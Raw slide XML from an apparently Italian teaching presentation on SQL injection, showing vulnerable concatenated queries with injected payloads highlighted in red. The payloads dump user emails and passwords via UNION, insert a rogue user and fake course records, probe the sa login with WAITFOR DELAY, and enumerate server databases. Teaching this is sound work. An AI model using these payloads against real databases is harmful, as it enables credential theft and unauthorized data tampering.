              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT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U.Id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, CONCAT(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U.Email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, '/',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U.Password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), NULL, NULL, NULL, NULL FROM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dbo.Users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 U ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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71384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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3796AD8C-2551-245C-DE9B-3C771744E3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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7295EA24-FC0F-702F-52C6-C2547316E2A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0150" y="1454970"/>
            <a:ext cx="65637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SQL Injection #3: query concatenating</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7EC7427D-4845-0F2A-5CB7-1DF8933DEA40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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{59C7CD34-6206-4422-B95D-231F419789C4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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	*</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>WHERE Email = 'test@example.com'</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>	AND Password = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>'; INSERT INTO </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> (Email, Password, FirstName, LastName) VALUES ('pippo@disney.com', 'clarabella', 'Pippo', 'De'' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>Pippis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>');--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:latin typeface="Comic Mono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76438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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC2FC190-071E-2A58-64FF-70D28413A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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{42A00334-F6A3-956A-9C17-E3E0CE6A9D5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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection #3: query concatenating</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{06BD36E1-B897-AE2D-16DE-15A41218908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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{46D8BA38-3B6E-49DE-B6C8-430535F532D6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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1) *</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>WHERE Email = 'test@example.com' AND Password = '</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>INSERT INTO </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> (Email, Password, FirstName, LastName) VALUES ('pippo@disney.com', 'clarabella', 'Pippo', 'De'' </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>Pippis</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>');</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1600" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:endParaRPr sz="1600" dirty="0">
              <a:latin typeface="Comic Mono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42403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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7647F138-F553-A411-2A55-5FF9986724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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A1F885EE-699A-FF18-A7CB-935398C1257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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Inserimento</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dati</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8B3FAB75-BBF2-E07A-7B3A-D7E6575D567F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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F3669C20-83E0-43F2-A4D7-EA2D0F7ACC29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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; INSERT INTO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dbo.Courses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 (Title, StartDate,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EndDate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, Result,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UserId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) SELECT DISTINCT Title, StartDate,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EndDate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, 28, (SELECT Id FROM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dbo.Users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 WHERE Email = 'pippo@disney.com') FROM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dbo.Courses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;--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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27882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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DDBFA3DA-798F-1FB8-B8D9-01B1F3B13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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{65209672-7197-9AAA-4D16-02CEB0E6FC4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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Inserimento</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dati</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6EEC1706-6143-67D6-A693-C6B1B4B2898F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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{424CC5F0-533F-387D-9F58-766257A194EF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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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'; INSERT INTO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dbo.Courses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 (Title, StartDate,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EndDate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, Result,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UserId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) SELECT 'Corso di tango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acrobatico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', CAST(CURRENT_TIMESTAMP AS DATE), CAST(CURRENT_TIMESTAMP AS DATE), 30, (SELECT Id FROM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dbo.Users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 WHERE Email = 'pippo@disney.com');--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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82992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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8083DC95-3002-1CA4-9F0F-A815BC0F63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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E3035CC-E2D0-1C86-680F-BEEF7D3BD65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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>SQL Injection #4: blind SQL injection</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D387EF08-5BA7-846B-194A-DECEE767AF5C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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EAC2156D-FE07-A41C-E0FF-8D4A7410BEF8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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT TOP (1)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*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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Users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WHERE Email = 'test@example.com'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AND Password = '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'; IF (SELECT SYSTEM_USER) = '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sa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' WAITFOR DELAY '00:00:05';--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>';</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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86213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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8514F820-9423-EBF7-BD2C-B1330B3245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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0BADEC0B-32D2-6FE8-ACE2-0A9D36C46C0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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>altri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> database </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sullo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>stesso</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> server</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="129" name="Google Shape;129;p31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6054B53A-18F4-4714-8669-FF27EEA95FBB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6500" y="448013"/>
            <a:ext cx="911000" cy="91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31">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0D62CB1C-1635-22DB-DE55-E5EFDA115907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128450" y="2195169"/>
            <a:ext cx="6887100" cy="2292051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127000" lvl="0">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:buClr>
                <a:srgbClr val="D93232"/>
              </a:buClr>
              <a:buSzPts val="1600"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>SELECT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Id, Title, StartDate, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>EndDate</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>, Result, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId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FROM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>dbo.Courses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WHERE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0" err="1">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>UserId</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t> = 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{</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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mic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>userId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}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AND Title LIKE '%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' UNION ALL SELECT NULL, D.name, NULL, NULL, NULL, NULL FROM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sys.databases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 D ORDER BY 2--</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1400" dirty="0">
                <a:latin typeface="Comic Mono" pitchFamily="1" charset="0"/>
              </a:rPr>
              <a:t>%' ORDER BY StartDate;</a:t>
            </a:r>
            <a:endParaRPr sz="1400" dirty="0">
              <a:latin typeface="Comic Mono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03315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>
          <a:extLst>
            <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
              <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{61095034-4560-3853-6547-41BB28E347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1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{41739FE4-3F2A-9890-D33A-084851C742B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0150" y="1454970"/>
            <a:ext cx="65637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lvl="0" algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Recuperare</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> la </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>struttura</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>degli</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>altri</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> database</a:t>
            </a:r>
            <a:endParaRPr dirty="0"/>
          </a:p>
        </p:txBody>
